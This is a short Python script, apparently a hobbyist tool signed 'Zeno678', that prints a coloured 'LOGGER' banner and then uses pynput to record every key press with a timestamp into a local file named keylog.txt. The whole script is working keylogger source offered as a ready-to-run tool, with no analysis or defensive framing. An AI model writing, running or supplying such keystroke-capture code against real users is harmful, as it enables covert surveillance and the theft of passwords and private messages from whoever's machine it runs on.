from pynput.keyboard import Key, Listener
import logging
from pystyle import *
import time
from random import *
import random 
import slowtype
from slowtype import *

print(Colorate.Horizontal(Colors.yellow_to_green, """
█   █▀█ █▀▀ █▀▀ █▀▀ █▀█
█▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄
""", 1))

time.sleep(1)

SlowTypes.SlowType("...")

time.sleep(0.3)

print(Colorate.Horizontal(Colors.red_to_purple, "Running : {Wait...}", 1))

time.sleep(0.2)

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

print(Colorate.Horizontal(Colors.yellow_to_green, "Running : {Ok}", 1))

time.sleep(0.2)
print(Colorate.Horizontal(Colors.yellow_to_green, "Version 1.0 by Zeno678", 1))
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()

